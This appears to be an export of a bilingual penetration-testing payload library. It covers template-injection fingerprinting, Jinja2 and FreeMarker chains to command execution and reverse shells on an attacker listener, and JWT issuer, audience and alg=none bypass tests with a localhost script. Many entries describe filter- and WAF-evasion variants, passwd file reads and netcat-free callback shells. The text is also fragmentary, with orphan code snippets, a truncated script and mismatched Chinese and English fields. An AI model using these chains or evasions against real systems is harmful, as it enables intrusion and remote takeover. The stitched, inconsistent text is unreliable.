name.zh: 多引擎 SSTI 指纹与验证集合
name.en: Multi-Engine SSTI Fingerprinting and Validation Set

description.zh: 汇总多种模板语法，用于在未知技术栈中建立引擎指纹并验证服务端表达式求值边界。
description.en: Collects multiple template syntaxes to fingerprint an unknown stack and validate the boundary of server-side expression evaluation.

prerequisites.zh: 未知技术栈的可控值确实进入服务端模板编译路径，能够逐个隔离 Jinja2、Mako、FreeMarker、SpEL 等候选语法而非混合投递。
prerequisites.en: A controllable value in an unknown stack reaches server-side template compilation, and candidate syntaxes such as Jinja2, Mako, FreeMarker, or SpEL can be isolated rather than submitted together.

prerequisites.zh: 每个候选引擎只使用其独有的无害算术/字符串 canary，并保存响应、错误签名、模板调用栈与版本证据。
prerequisites.en: Each candidate engine uses its own harmless arithmetic or string canary, preserving responses, error signatures, template call stacks, and version evidence.

description.zh: 逐行按引擎指纹提交（${ }、{{ }}、<% %>、#{ } 等形态）；出现 49、config 或命令输出即确认对应引擎把输入当模板求值。命令执行行仅在授权实验环境、以隔离 marker 验证，不读取真实文件。
description.en: Submit engine fingerprints line by line (${ }, {{ }}, <% %>, #{ } forms); 49, config, or command output appearing confirms that engine evaluates input as template. Command-execution lines run only in an authorized lab with isolated markers, never reading real files.

analysis.zh: 阳性证据是某一候选语法在服务端由对应模板引擎稳定求值，并通过引擎特有 canary/错误和调用栈交叉确认；随后能力必须另行验证。 假阳性边界：整套字典中任一字符串变化、通用 49、客户端模板执行、错误页关键词、超时、WAF 规则命中或高危文件读取示例本身都不是引擎确认。
analysis.en: Positive evidence requires one candidate syntax to be consistently evaluated server-side by its matching engine and cross-confirmed by engine-specific canary or error plus call stack; further capability is assessed separately. False-positive boundary: Any response change from the corpus, generic 49, client-side template execution, error-page keywords, timeout, WAF match, or the presence of high-impact file-read examples does not confirm an engine.

opsecTips.zh: 广谱指纹阶段每轮只投递一个短 canary；对象图、文件读取与命令执行样例仅在命中候选引擎后的授权实验环境使用，发现模板缓存污染、错误风暴、CPU 增长或非预期输出时停止。
opsecTips.en: Multi-engine fingerprinting submits one short canary per run and forbids object-graph, file-read, and command examples; stop on template-cache contamination, error storms, CPU growth, or unexpected output.

opsecTips.zh: 删除候选输入和编译模板，清理各引擎缓存/错误日志/canary，重启测试 renderer，并记录排除与确认的引擎版本。
opsecTips.en: Delete candidate inputs and compiled templates, clear each engine's caches, error logs, and canaries, restart test renderers, and record excluded and confirmed engine versions.

description.zh: 一次探测区分引擎族：Jinja2 输出 7777777、Twig 输出 49。判据：回显符合其一即可定引擎。
description.en: One probe splits families: Jinja2 prints 7777777, Twig prints 49. Success: echo matches one of them.

description.zh: 单请求覆盖三类定界符减少 WAF 往返。判据：任一表达式求值即存在注入。
description.en: Covers three delimiter families in one request. Success: any evaluation proves injection.

description.zh: 编码花括号绕过字面规则。判据：解码后回显 49。
description.en: Encoded braces. Success: echoes 49 after decoding.

description.zh: 补齐 # 风格引擎指纹。判据：输出 49。
description.en: Covers #-style engines. Success: prints 49.

description.zh: FreeMarker 风格探测避开 {{ 规则。判据：输出 49。
description.en: FreeMarker-style probe avoiding {{ rules. Success: prints 49.

description.zh: 补齐 #{} 族。判据：输出 49。
description.en: Covers #{} family. Success: prints 49.

description.zh: 多定界符一次探测。判据：任一求值即命中。
description.en: Multiple delimiters in one shot. Success: any evaluation hits.

title.en: Validation step 1 for Generic SSTI Expression Probes

description.zh: 逐行提交四种花括号/插值形态；输出 49 即确认对应引擎把输入当模板求值，可据此选定引擎专属集合继续验证。
description.en: Submit the four brace/interpolation forms line by line; 49 in the output confirms that engine evaluates input as template, selecting the engine-specific set for follow-up.

description.zh: 根据响应头、错误页、依赖清单和业务框架列出可能引擎，并为每个引擎定义唯一无副作用预期值。
description.en: Use headers, error pages, dependency inventory, and the application framework to list candidate engines and define a unique side-effect-free expected value for each.

description.zh: 分批运行现有多引擎表达式集合，记录每组响应差异，避免大量语法混合后无法归因。
description.en: Run the existing multi-engine expression set in batches and record response differences so any result can be attributed to a syntax family.

title.zh: 用错误语法确认解析层
title.en: Confirm the parser with malformed syntax

description.zh: 对候选语法加入错误表达式和随机常量，结合服务端模板日志确认实际引擎及求值层。
description.en: Add malformed expressions and random constants for candidate syntax and use server template logs to confirm the actual engine and evaluation layer.

description.zh: 确定引擎后停止广谱探测，按对应引擎收紧模板来源、上下文和沙箱，并执行专属回归用例。
description.en: After identifying the engine, stop broad probing, restrict template sources, context, and sandbox settings for that engine, and run engine-specific regression cases.

overview.zh: 覆盖多模板引擎的指纹识别与求值验证：${ }、{{ }}、<% %>、#{ } 等分隔符形态逐行探测，以 49、config 或命令输出确认引擎类型。适用于技术栈未知、同一参数可能经多层渲染的场景，命中后转对应引擎条目深入。
overview.en: Covers multi-engine template fingerprinting and evaluation verification: probing ${ }, {{ }}, <% %>, and #{ } delimiter shapes line by line, confirming the engine via 49, config, or command output. Suitable for unknown stacks where one parameter may pass through multiple render layers; on a hit, continue with the matching engine-specific entry.

vulnerability.zh: 根因可能位于视图名拼接、邮件/报表模板、CMS 可编辑模板或二次渲染链；多层框架会对分隔符转义、预处理或再次解释，需通过成对对照定位实际求值层。
vulnerability.en: The root cause may sit in view-name concatenation, email/report templates, CMS-editable templates, or secondary render chains; multiple layers may escape, preprocess, or re-interpret delimiters, so paired comparisons are needed to locate the actual evaluation layer.

exploitation.zh: 按 Payload 列表顺序使用：先记录各候选引擎无副作用算术表达式及预期值，再分批逐行按 ${ }、{{ }}、<% %>、#{ } 等分隔符形态提交；出现 49、config 或命令输出即确认对应引擎把输入当模板求值。命中后用错误表达式与随机常量复测，并转对应引擎专项条目深入。命令执行行仅在授权实验环境以隔离 marker 验证。
exploitation.en: Use in Payload list order: first record each candidate engine's side-effect-free arithmetic expression and expected value, then submit line by line in batches across ${ }, {{ }}, <% %>, and #{ } delimiter shapes; seeing 49, config, or command output confirms the matching engine evaluates input as template source. Re-test hits with invalid expressions and random constants, then continue with the engine-specific entry. Command-execution lines are verified only in authorized labs with isolated markers.

mitigation.zh: 统一模板服务边界禁止动态模板源码与动态视图名，各引擎启用变量绑定、自动转义与沙箱，去除不必要的二次渲染；修复后指纹载荷应全部原样输出。
mitigation.en: Unify the template service boundary forbidding dynamic template source and dynamic view names, enable variable binding, autoescaping, and sandboxing per engine, and remove unnecessary secondary rendering; after the fix, fingerprint payloads must all output verbatim.

name.zh: Jinja2 SSTI 进程执行链

description.zh: 覆盖 Flask globals、Python 子类枚举和 builtins 导入的 Jinja2 表达式，用于确认模板注入是否跨越沙箱并到达进程执行。
description.en: Covers Flask globals, Python subclass enumeration, and builtins imports in Jinja2 expressions to test whether template injection escapes sandboxing and reaches process execution.

prerequisites.zh: 已用无害算术 marker 确认目标存在 Jinja2 模板源码求值（SSTI），并记录 Jinja2/Flask 版本、沙箱和可见对象，满足：不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。
prerequisites.en: Harmless arithmetic confirms template-source evaluation for Jinja2 SSTI Process Execution Chains; Jinja2 or Flask versions, sandboxing, and exposed objects are recorded, and an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

prerequisites.zh: 一次性模板 worker 可记录属性拒绝、渲染、子进程审计和模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。
prerequisites.en: A disposable template worker can record denied attributes, rendering, child-process auditing, and the template resolution path, render log, fixed child-process marker, and request identifier fully correlate.

description.zh: 以三种 Jinja2 对象图链触发反向 shell；{ATTACKER_IP}:{LPORT} 监听端收到回连会话即确认 SSTI 到进程执行链成立。仅在授权实验环境执行，监听地址与端口由变量渲染。
description.en: Trigger reverse shells through three Jinja2 object-graph chains; a callback session arriving at the {ATTACKER_IP}:{LPORT} listener confirms the SSTI-to-process-execution chain. Run only in an authorized lab — listener address and port render from variables.

analysis.zh: 阳性要求模板源码逐步到达 globals/类型对象，再到进程 API，并取得模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。算术成立、对象名回显、subclasses 索引报错或反连字符串被渲染均是假阳性，不能证明“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
analysis.en: A positive traces template source through globals or type objects to a process API and obtains the template resolution path, render log, fixed child-process marker, and request identifier fully correlate. Arithmetic, reflected object names, subclass-index errors, or rendered reverse-command strings are false positives and do not prove whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: 停止条件：无需完整会话验证时，把反连命令降级为输出固定 stdout 标记的等价命令；worker 创建非预期进程、访问真实文件或监听端收到预期外连接时立即销毁并停止。本条重点观察模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess。
opsecTips.en: Jinja2 SSTI Process Execution Chains stop condition: Replace reverse behavior with a fixed stdout marker; destroy the worker and stop on unexpected processes, network, or real-file access. The entry-specific focus is whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: Jinja2 SSTI 进程执行链清理条件：结束后删除测试模板和缓存、轮换临时会话、重建 worker，并确认 globals、调试器和测试路由未残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Jinja2 SSTI Process Execution Chains cleanup condition: Delete test templates and caches, rotate temporary sessions, rebuild the worker, and verify globals, debuggers, and test routes are removed. Recheck that no triggerable state remains for this technique.

description.zh: 绕过 request.application 特征：改由 lipsum 全局取 os。判据：攻击机收到 shell。
description.en: Reaches os via lipsum globals instead of request. Success: shell received on the listener.

description.zh: 纯 bash 反弹免 nc 依赖。判据：收到交互 shell。
description.en: Pure-bash reverse shell without nc. Success: interactive shell obtained.

description.zh: 全程无点号绕过 . 过滤。判据：回显 uid。
description.en: No dots anywhere to dodge dot filters. Success: uid echoed.

title.zh: 规避变体：免 netcat fifo 反弹

description.zh: 规避点：目标无交互工具时用 fifo 管道常驻反弹。判据：监听端口收到 shell。
description.en: fifo pipe keeps a callback alive without interactive tools. Success: listener receives the shell.

description.zh: 换 gadget 读任意文件。判据：返回 passwd。
description.en: Alternate gadget for arbitrary read. Success: passwd returned.

description.zh: 关键步骤用下标替代属性点。判据：回显 uid。
description.en: Subscripts replace attribute dots. Success: uid echoed.

description.zh: 纯下标链绕过双下划线过滤。判据：返回 builtins 对象。
description.en: Pure subscript chain. Success: builtins object returned.

description.zh: 经模板上下文兜底。判据：命令输出。
description.en: Falls back through the template context. Success: command output.

description.zh: 先以 {{config}}/{{request}} 等指纹行确认 Jinja2 求值，再逐行测试对象图到 popen/exec 的命令执行；输出出现命令结果即确认对应链可用。仅在授权实验环境执行。
description.en: Confirm Jinja2 evaluation with fingerprint lines like {{config}}/{{request}}, then test object-graph chains to popen/exec line by line; command results in the output confirm each chain. Run only in an authorized lab.

title.zh: 确认 Jinja2 模板源码可控

description.zh: 使用算术和固定字符串区分模板源码注入与普通变量渲染，并核对“不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程”。
description.en: Use arithmetic and fixed strings to distinguish template-source injection from ordinary variable rendering and confirm that an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

description.zh: 逐步检查 request、globals、类型属性与沙箱拒绝记录，采用“模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联”作为跨入进程边界的证据。
description.en: Inspect request, globals, type attributes, and sandbox denials incrementally, using the template resolution path, render log, fixed child-process marker, and request identifier fully correlate as evidence of process-boundary crossing.

title.zh: 无害重放“Jinja2 SSTI 进程执行链”对象链
title.en: Replay the Jinja2 SSTI Process Execution Chains chain harmlessly

description.zh: 测试步骤为：先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每条反连命令在运行前替换为固定 stdout 标记。
description.en: establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Replace every reverse command with a fixed stdout marker before runtime.

description.zh: 实施“禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程”后重放算术、合法变量和原对象链，确认渲染保留且对象遍历被拒绝。
description.en: Apply never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes, then replay arithmetic, valid variables, and original chains to preserve rendering while denying object traversal.

overview.zh: 覆盖 Jinja2 SSTI 到进程执行的升级链验证：以 Flask globals、Python 子类枚举与 builtins 导入三类对象图链触发反向 shell，确认模板注入跨越沙箱到达进程执行。
overview.en: Covers escalation-chain verification from Jinja2 SSTI to process execution: triggering reverse shells via three object-graph chains — Flask globals, Python subclass enumeration, and builtins imports — confirming template injection crosses the sandbox into process execution.

vulnerability.zh: 根因是不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程；对象解析链是否可达 os/subprocess 取决于模板上下文暴露面。
vulnerability.en: The root cause is untrusted strings compiled by Jinja2 as template source with sandboxing off or attribute policies bypassable, while the process account allows spawning children; whether object-resolution chains reach os/subprocess depends on template-context exposure.

exploitation.zh: 使用第 1 步命令以三种 Jinja2 对象图链触发反向 shell，{ATTACKER_IP}:{LPORT} 渲染为授权监听地址；监听端收到回连会话即确认 SSTI 到进程执行链成立。仅在授权实验环境执行；先用算术与安全属性访问建立 SSTI 基线，再把反连命令替换为固定 stdout 标记逐条确认三类对象链，取得最小证据后停止。
exploitation.en: Use the step 1 command to trigger reverse shells via the three Jinja2 object-graph chains, with {ATTACKER_IP}:{LPORT} rendered as the authorized listener; the listener receiving a callback session confirms the SSTI-to-process-execution chain. Execute only in authorized labs; baseline SSTI with arithmetic and safe property access first, then swap callback commands for fixed stdout markers verifying each object chain, stopping at minimal evidence.

mitigation.zh: 禁止将用户内容作为模板源码，使用固定模板与数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程；回归确认不可信内容始终作为数据处理且无法访问 globals、类型对象或进程 API。
mitigation.en: Never use user content as template source — fixed templates with data parameters instead; enable and tighten sandbox attribute policies, run low-privileged, and block template processes from spawning children; regress to confirm untrusted content stays data and cannot reach globals, type objects, or process APIs.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: FreeMarker 模板表达式注入

description.zh: 针对 Java FreeMarker 模板中用户输入进入模板源码的场景，区分普通插值、危险内建函数和类实例化能力。
description.en: Covers Java FreeMarker cases where user input reaches template source, distinguishing ordinary interpolation from dangerous built-ins and class instantiation capabilities.

prerequisites.zh: 不可信输入被拼入 FreeMarker 模板源码，Configuration 版本、TemplateClassResolver、api_builtin_enabled 和对象包装器策略可核验。
prerequisites.en: Untrusted input is concatenated into FreeMarker template source, with Configuration version, TemplateClassResolver, api_builtin_enabled, and object-wrapper policy verifiable.

prerequisites.zh: 隔离配置注册只返回固定 canary 的测试 directive/model，并跟踪模板编译、?new/type resolution 与方法调用；不执行 Execute/ProcessBuilder。
prerequisites.en: An isolated configuration registers a test directive or model returning only a fixed canary and traces template compilation, ?new or type resolution, and method calls without executing Execute or ProcessBuilder.

description.zh: 以 Execute/ObjectConstructor/JythonRuntime 三类工具类逐行执行命令；输出命令结果即确认对应 FreeMarker 执行链。仅在授权实验环境执行。
description.en: Execute commands via the Execute/ObjectConstructor/JythonRuntime utility classes line by line; command results in the output confirm each FreeMarker chain. Run only in an authorized lab.

analysis.zh: 阳性证据是目标 FreeMarker evaluator 将可控语法编译为表达式，并突破预期数据模型范围调用测试 directive/model 产生 canary，调用栈可定位。 假阳性边界：${...} 正常变量插值、?new 被策略拒绝、Execute 类不在 resolver、模板语法错误、命令字符串被回显或本地 FreeMarker PoC 有效均不是目标 RCE。
analysis.en: Positive evidence requires the target FreeMarker evaluator to compile controlled syntax and exceed the intended data-model scope by invoking the test directive or model to produce a canary, with a traceable call stack. False-positive boundary: Normal ${...} variable interpolation, policy rejection of ?new, Execute absent from the resolver, template syntax errors, reflected command text, or a local FreeMarker proof does not prove target RCE.

opsecTips.zh: FreeMarker 验证禁止执行原 Execute/ProcessBuilder 命令或访问真实数据模型；出现进程、反射、文件/网络副作用、模板全局修改或线程异常时停止。
opsecTips.en: FreeMarker validation never executes source Execute or ProcessBuilder commands or accesses real data models; stop on processes, reflection, file or network effects, global template mutation, or thread anomalies.

opsecTips.zh: 移除测试 directive/model 和模板，清理 FreeMarker 模板缓存与 canary，恢复 resolver/object-wrapper 配置并重启测试应用。
opsecTips.en: Remove test directives, models, and templates, clear FreeMarker template caches and canaries, restore resolver and object-wrapper configuration, and restart the test application.

description.zh: 换工具类避开 Execute 特征。判据：进程执行。
description.en: Different utility class evades Execute signatures. Success: process runs.

description.zh: 单行内联改写绕过 assign 特征。判据：回显用户名。
description.en: Single-line inline form. Success: username echoed.

description.zh: classpath 有 jython 时以 python 执行。判据：命令输出。
description.en: Python execution when jython is present. Success: command output.

title.zh: 识别 FreeMarker 解析上下文

description.zh: 通过错误签名、响应结构和服务端配置确认输入确实进入 FTL 源码，而不是普通变量数据绑定。
description.en: Use error signatures, response structure, and server configuration to confirm that input reaches FTL source rather than ordinary variable data binding.

description.zh: 在隔离模板中提交现有 FreeMarker 样例，观察危险 utility 类是否被解析、拒绝或根本不可见。
description.en: Submit the existing FreeMarker sample in an isolated template and observe whether dangerous utility classes resolve, are denied, or remain unavailable.

description.zh: 把求值结果与 ObjectWrapper、TemplateClassResolver、共享变量和版本配置对应，排除仅由静态替换造成的表象。
description.en: Map evaluation results to the ObjectWrapper, TemplateClassResolver, shared variables, and version configuration, excluding static substitution artifacts.

title.zh: 收紧 FTL 能力并回归

description.zh: 取消源码拼接、限制模板来源和类解析能力后复测常量表达式与危险类，确认业务模板正常且越界能力消失。
description.en: Remove source concatenation, restrict template sources and class resolution, then retest constants and dangerous classes to confirm business templates work without boundary escape.

overview.zh: 覆盖 Java FreeMarker 的模板注入验证：Execute、ObjectConstructor 与 JythonRuntime 三类工具类执行链。适用于用户输入进入 FTL 模板源码的场景，按版本与 TemplateClassResolver 配置评估实际能力。
overview.en: Covers Java FreeMarker template injection verification: execution chains via the Execute, ObjectConstructor, and JythonRuntime utility classes. Suitable when user input enters FTL template source, with real capability assessed per version and TemplateClassResolver configuration.

vulnerability.zh: 根因不是 FreeMarker 固有后门，而是数据与模板代码边界被破坏且危险 utility 类、对象构造器对模板可见；受限配置、旧版配置与自定义扩展下同一表达式能力完全不同。
vulnerability.en: The root cause is not a FreeMarker backdoor but a broken boundary between data and template code with hazardous utility classes and object constructors visible to templates; the same expression's capability varies entirely across restricted, legacy, and custom-extended configurations.

exploitation.zh: 使用第 1 步命令以 Execute/ObjectConstructor/JythonRuntime 三类工具类逐行执行命令；输出命令结果即确认对应 FreeMarker 执行链。先用常量运算确认 FTL 表达式求值并记录模板错误类型，再检查模板可见变量与类解析器配置，不直接假设工具类可用。仅在授权实验环境执行。
exploitation.en: Use the step 1 command to execute commands line by line via the Execute/ObjectConstructor/JythonRuntime utility classes; command output confirms the corresponding FreeMarker chain. Establish FTL expression evaluation with constant arithmetic and record template error types first, then inspect template-visible variables and the class resolver without assuming the utilities are available. Execute only in authorized labs.

mitigation.zh: 用户值永远作为数据模型变量传入，不拼接 FTL 源码；使用 TemplateClassResolver.SAFEST_RESOLVER（或更严格的 ALLOWS_NOTHING_RESOLVER）并禁止危险 utility 类；限制模板加载位置与上传权限，升级 FreeMarker 并为危险内建函数添加负向回归。
mitigation.en: Always pass user values as data-model variables without concatenating FTL source; use SAFER_RESOLVER or a stricter TemplateClassResolver and forbid hazardous utility classes; restrict template loading locations and upload privileges, upgrade FreeMarker, and add negative regressions for dangerous built-ins.

name.zh: JWT Claim Profile 验证

description.zh: 分别验证 issuer、audience 与 expiration，只有完全匹配的短期测试 token 可以访问只读标记。
description.en: Validates issuer, audience, expiration, and explicit token type independently so only a fully matching short-lived test token reaches the read-only marker.

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT Claim Profile 验证对照 1

execution.command:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
now = int(time.time())
cases = {
    "valid": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-issuer": {"sub":"payloader-user","iss":"payloader-other","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-audience": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-other","iat":now,"exp":now+60},
    "expired": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now-120,"exp":now-60},
}
for name, claims in cases.items():
    header = encode({"alg":"HS256","typ":"payloader+jwt","kid":"PAYLOADER_TEST_KEY"})
    payload = encode(claims)
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(name, status)
PY
# Only the valid profile reaches the read-only marker; issuer, audience, and expiration failures are independent.

description.zh: 在隔离环境执行该JWT Claim Profile 验证对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。
description.en: Run this JWT Claim Profile Validation control in isolation, access only the localhost read-only marker, and record server-side algorithm, key, and claim decisions.

analysis.zh: 本条聚焦 JWT 声明校验边界。阳性必须表现为 localhost 验证器在错误 issuer、错误 audience 或过期条件下仍建立主体并读取同一只读标记，同时由验证器日志确认具体放行分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This entry focuses on Mixed JWT Validation Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

description.zh: 绕过头部单键解析的 WAF 规则：重复 alg 键在验证层与日志层取值不同。成功判据：none 实例被验证接受。
description.en: Bypasses single-key header parsing: duplicate alg keys resolve differently in validation vs logging. Success: the none instance is accepted by validation.

description.zh: 签发者字段用数组形态绕过字符串精确比对。成功判据：任一签发者被采信。
description.en: Array-shaped issuer bypasses exact string comparison. Success: either issuer is honored.

description.zh: 字符串与数组形态交替命中弱受众校验。成功判据：admin-api 受众下令牌仍有效。
description.en: String and array alternation hits weak audience validation. Success: the token still works for the admin-api audience.

title.zh: 建立JWT Claim Profile 验证基线

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT Claim Profile 验证阴性对照
title.en: Submit the JWT Claim Profile Validation Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

overview.zh: 该 Payload 覆盖 JWT 声明校验完整性场景，检验验证器是否严格执行 issuer、audience 与 expiration 的全部匹配。验证维度为本地构造的多组 claim 对照 token 单步执行，对应第 1 步。
overview.en: This payload covers JWT claim validation completeness, testing whether the verifier strictly enforces issuer, audience, expiration and explicit token-type matching. Validation runs multiple locally crafted claim-control tokens in a single step, mapped to step 1.

vulnerability.zh: 根因在于验证器只校验签名而放松声明约束：签发者、受众、有效期或令牌类型任一字段未被严格比对，攻击者即可复用或改签其他用途的合法签名令牌跨服务冒用身份。
vulnerability.en: The root cause is a verifier that checks only the signature while relaxing claim constraints: if issuer, audience, expiration or token type is not strictly compared, attackers can reuse or re-sign tokens issued for other purposes to impersonate identities across services.

exploitation.zh: 第 1 步执行脚本在本地生成仅 claim 不同的对照 token 序列并逐个请求 localhost 只读标记端点，记录服务端返回的算法、key 与 claim 决策；任一字段不符仍放行即确认校验缺失，全部拒绝则证明声明校验完整。成功判据以服务端决策记录为准。占位符在全局变量菜单替换为目标值；结果与只读标记一并留档进报告。
exploitation.en: In step 1, run the script to generate locally a sequence of tokens differing only in claims and request the localhost read-only marker endpoint one by one, recording the server's algorithm, key and claim decisions; acceptance despite a mismatched field confirms missing validation, while uniform rejection proves complete claim checking. Judge success by server decision logs. Replace placeholders via the global variables menu; file the results with the read-only marker in your report.

mitigation.zh: 验证器强制校验 iss、aud、exp 与类型声明，任何字段不匹配一律拒绝并采用短有效期。修复后重放第 1 步对照序列，所有不符令牌应被 401 拒绝。
mitigation.en: Enforce strict iss, aud, exp and type-claim validation, rejecting any mismatch with short lifetimes. After the fix, replay the step 1 control sequence: every mismatched token should be rejected with 401.

import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()

    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)

Validation covers five control groups across none variants, missing alg, and arbitrary or empty signatures, mapped to steps 1 through 5.

vulnerability.zh: 根因在于验证器允许算法协商且未在验签前锁定 alg：none 或空签名令牌被解析进授权逻辑，攻击者无需密钥即可伪造任意身份与权限声明。
vulnerability.en: The root cause is algorithm negotiation without pinning alg before verification: none or empty-signature tokens are parsed into authorization logic, letting attackers forge any identity or privilege claims without a key.

exploitation.zh: 第 1、2 步在本地生成未签名令牌（不提交），确认可任意构造；第 3 步提交 alg=none 令牌观察验签是否被跳过；第 4 步提交 none/None/NONE/缺失算法四种变体；第 5 步以空签名、任意签名与缺失签名段对照，确认对畸形结构的失败关闭行为。任一未签名令牌被接受即确认算法固定缺失，以服务端 401 决策为成功判据。占位符在全局变量菜单替换；全程仅访问只读标记端点。
exploitation.en: In steps 1 and 2, run the script to generate none case and missing-alg variant tokens and submit each; any acceptance confirms missing algorithm pinning. In steps 3 and 4, compare empty and arbitrary signature values to see whether verification is skipped. In step 5, submit malformed signature structures to confirm fail-closed behavior. Use the server's 401 decisions as success criteria; accepting any unsigned token proves the flaw. Replace placeholders via the global variables menu; only the read-only marker endpoint is accessed throughout.

mitigation.zh: 验证器在解析后立即断言 alg 属于预配置白名单，none 一律拒绝，验签失败时中止授权流程。修复后重放第 1 至第 5 步，全部变体应返回拒绝。
mitigation.en: Assert immediately after parsing that alg is in a preconfigured allowlist, always reject none, and abort authorization when verification fails. After the fix, replay steps 1 through 5: every variant should be rejected.

name.zh: JWT 算法与 Key 类型绑定

description.zh: 使用临时本地 RSA public key 构造历史 RS256 到 HS256 混淆对照，确认验证器固定算法且不把 public key 当 HMAC secret。
description.en: Builds a historical RS256-to-HS256 confusion control from a temporary local RSA public key and confirms that the verifier pins algorithms and never treats the public key as an HMAC secret.

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: (1)仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；执行 WAF 变体前先把目标签发方 RS256 公钥（可从其 JWKS 导出，本地自测可用 `mkdir -p .payloader-jwt-fixture && openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out .payloader-jwt-fixture/attacker.pem && openssl pkey -in .payloader-jwt-fixture/attacker.pem -pubout -out .payloader-jwt-fixture/public.pem` 自造）保存为 .payloader-jwt-fixture/public.pem；不得读取生产私钥/token、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT 算法与 Key 类型绑定对照 1
title.en: JWT Algorithm and Key-Type Binding Control 1

execution.command:
work_dir="$(mktemp -d)"
